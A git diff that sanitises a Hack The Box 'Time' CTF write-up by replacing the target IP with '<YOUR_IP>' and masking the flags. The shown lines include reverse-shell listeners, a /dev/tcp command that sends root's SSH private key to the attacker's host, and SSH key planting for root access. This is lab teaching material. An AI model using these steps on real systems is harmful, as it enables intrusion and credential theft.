@@ -11,8 +11,6 @@ htb_url: https://app.hackthebox.com/machines/Time
 ---
 ## Overview
 
-![](https://github.com/zweilosec/htb-writeups/tree/b40bc088c8cf564cc8693f3b815c9e3b2095d693/linux-machines/medium/machine%3E.infocard.png)
-
 Short description to include any strange things to be dealt with...This machine was dissapointingly easy for a medium box. It definitely should have been classified 'Easy'. A simple test at the beginning revealed a verbose error message. Some quick googling leads to an easy to use exploit. After that simple enumeration leads to a weakly protected script that gets executed as root, and leaves the player a million routes to root through arbitrary code execution.
 
 ## Useful Skills and Tools
@@ -29,11 +27,11 @@ Short description to include any strange things to be dealt with...This machine 
 
 ### Nmap scan
 
-I started my enumeration with an nmap scan of `10.10.10.214`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves all types of output \(.nmap,.gnmap, and .xml\) with filenames of `<name>`.
+I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves all types of output \(.nmap,.gnmap, and .xml\) with filenames of `<name>`.
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/time]
-└─$ nmap -sCV -n -p- -Pn -v -oA time  10.10.10.214 
+└─$ nmap -sCV -n -p- -Pn -v -oA time  <YOUR_IP> 
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-15 18:08 EDT
 
@@ -143,8 +141,8 @@ AFter some testing, I discovered that the POC code had some `\` that they were u
 ┌──(zweilos㉿kali)-[~/htb/time]
 └─$ python3 -m http.server 8082                 
 Serving HTTP on 0.0.0.0 port 8082 (http://0.0.0.0:8082/) ...
-10.10.10.214 - - [15/Mar/2021 19:31:42] "GET /test.sql HTTP/1.1" 200 -
-10.10.10.214 - - [15/Mar/2021 19:36:15] "GET /test.sql HTTP/1.1" 200 -
+<YOUR_IP> - - [15/Mar/2021 19:31:42] "GET /test.sql HTTP/1.1" 200 -
+<YOUR_IP> - - [15/Mar/2021 19:36:15] "GET /test.sql HTTP/1.1" 200 -
 ```
 
 After I removed them from my code I got a connection back, downloading my test.sql.
@@ -152,7 +150,7 @@ After I removed them from my code I got a connection back, downloading my test.s
 ```text
 zweilos@kali:~/htb/time$ nc -lvnp 8081
 listening on [any] 8081 ...
-connect to [10.10.14.159] from (UNKNOWN) [10.10.10.214] 36640
+connect to [10.10.14.159] from (UNKNOWN) [<YOUR_IP>] 36640
 uid=1000(pericles) gid=1000(pericles) groups=1000(pericles)
 ```
 
@@ -163,7 +161,7 @@ I got a connection back on my machine, proving the remote code execution worked.
 ```text
 zweilos@kali:~/htb/time$ nc -lvnp 8081
 listening on [any] 8081 ...
-connect to [10.10.14.159] from (UNKNOWN) [10.10.10.214] 36644
+connect to [10.10.14.159] from (UNKNOWN) [<YOUR_IP>] 36644
 bash: cannot set terminal process group (894): Inappropriate ioctl for device
 bash: no job control in this shell
 pericles@time:/var/www/html$ which python3
@@ -242,7 +240,7 @@ drwxr-xr-x 3 pericles pericles 4096 Oct  2 13:20 snap
 pericles@time:/home/pericles$ cat user
 cat: user: No such file or directory
 pericles@time:/home/pericles$ cat user.txt 
-f2555e4414a9821013d82bfbdb6d13e3
+****
 ```
 
 After checking `pericles`' home directory I found the `user.txt` proof!
@@ -421,7 +419,7 @@ cat /root/.ssh/id_rsa > /dev/tcp/10.10.14.159/8082 2>&1
 ┌──(zweilos㉿kali)-[~/htb/time]
 └─$ nc -lvnp 8082 > time.key
 listening on [any] 8082 ...
-connect to [10.10.14.159] from (UNKNOWN) [10.10.10.214] 33180
+connect to [10.10.14.159] from (UNKNOWN) [<YOUR_IP>] 33180
 
 ┌──(zweilos㉿kali)-[~/htb/time]
 └─$ cat time.key 
@@ -441,7 +439,7 @@ Next I changed the script so it would send me the user ID information of the con
 ┌──(zweilos㉿kali)-[~/htb/time]
 └─$ nc -lvnp 8082 > time.key
 listening on [any] 8082 ...
-connect to [10.10.14.159] from (UNKNOWN) [10.10.10.214] 33196
+connect to [10.10.14.159] from (UNKNOWN) [<YOUR_IP>] 33196
 
 ┌──(zweilos㉿kali)-[~/htb/time]
 └─$ cat time.key
@@ -462,7 +460,7 @@ Next I tried sending my SSH public key to `root`'s `authorized_keys` file. Each 
 ┌──(zweilos㉿kali)-[~/htb/time]
 └─$ nc -lvnp 8082                                                                             148 ⨯ 1 ⚙
 listening on [any] 8082 ...
-connect to [10.10.14.159] from (UNKNOWN) [10.10.10.214] 33236
+connect to [10.10.14.159] from (UNKNOWN) [<YOUR_IP>] 33236
 Key away! Try to log in through SSH.
 ```
 
@@ -470,11 +468,11 @@ Key away! Try to log in through SSH.
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/time]
-└─$ ssh root@10.10.10.214 -i root.key                                                               1 ⚙
-The authenticity of host '10.10.10.214 (10.10.10.214)' can't be established.
+└─$ ssh root@<YOUR_IP> -i root.key                                                               1 ⚙
+The authenticity of host '<YOUR_IP> (<YOUR_IP>)' can't be established.
 ECDSA key fingerprint is SHA256:sMBq2ECkw0OgfWnm+CdzEgN36He1XtCyD76MEhD/EKU.
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added '10.10.10.214' (ECDSA) to the list of known hosts.
+Warning: Permanently added '<YOUR_IP>' (ECDSA) to the list of known hosts.
 Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-52-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
@@ -489,14 +487,12 @@ Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-52-generic x86_64)
   Swap usage:              0%
   Processes:               237
   Users logged in:         0
-  IPv4 address for ens160: 10.10.10.214
+  IPv4 address for ens160: <YOUR_IP>
   IPv6 address for ens160: dead:beef::250:56ff:feb9:e959
-
 
 168 updates can be installed immediately.
 47 of these updates are security updates.
 To see these additional updates run: apt list --upgradable
-
 
 The list of available updates is more than a week old.
 To check for new updates run: sudo apt update
@@ -506,7 +502,7 @@ root@time:~# id && hostname
 uid=0(root) gid=0(root) groups=0(root)
 time
 root@time:~# cat root.txt 
-14335af5e1db1ea31c221882be1389c6
+****
 root@time:~# ls -la
 total 5816
 drwx------  7 root root    4096 Mar 16 22:43 .
@@ -532,7 +528,3 @@ zip -r website.bak.zip /var/www/html && mv website.bak.zip /root/backup.zip
 And that was it!
 
 note: If you ran `script` earlier to log your console, make sure to type exit until you get the "Script done." message, back on your box.
-
-Thanks to [`egotisticalSW`](https://app.hackthebox.eu/users/94858) & [`felamos`](https://app.hackthebox.eu/users/27390) for something interesting or useful about this machine.
-
-If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
